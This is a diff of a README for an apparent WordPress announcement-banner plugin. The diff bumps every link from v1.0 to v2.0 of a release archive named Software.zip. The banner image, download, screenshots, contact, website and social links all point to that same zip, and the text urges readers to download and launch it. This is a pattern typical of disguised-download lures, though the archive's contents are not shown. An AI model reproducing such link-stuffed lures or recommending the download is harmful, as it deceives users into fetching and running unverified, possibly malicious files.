@@ -1,6 +1,6 @@
 # 🎉 Welcome to wp-ankuendigungsbanner! 🎉
 
-![WordPress Banner Plugin](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip)
+![WordPress Banner Plugin](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -19,7 +19,7 @@
 
 ---
 
-## 📥 [Download Plugin](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip)
+## 📥 [Download Plugin](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip)
 
 ### Please download the file and launch it in your WordPress website to start using the plugin.
 
@@ -61,8 +61,8 @@ add_action('wp_head', 'display_announcement_bar');
 
 ## 📷 Screenshots:
 
-![Screenshot 1](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip)
-![Screenshot 2](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -79,7 +79,7 @@ add_action('wp_head', 'display_announcement_bar');
 ---
 
 ## 📞 Contact:
-### For any inquiries or support, please reach out to us at [https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip).
+### For any inquiries or support, please reach out to us at [https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip).
 
 ---
 
@@ -89,14 +89,14 @@ add_action('wp_head', 'display_announcement_bar');
 ---
 
 ## 🌐 Visit Our Website:
-### [Visit Here!](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip)
+### [Visit Here!](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 📣 Stay Connected:
 ### Connect with us on social media for plugin updates and more!
-### [Twitter](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip)
-### [Facebook](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v1.0/Software.zip)
+### [Twitter](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip)
+### [Facebook](https://github.com/harukunnsamaennjoy/wp-ankuendigungsbanner/releases/download/v2.0/Software.zip)
 
 ---
 
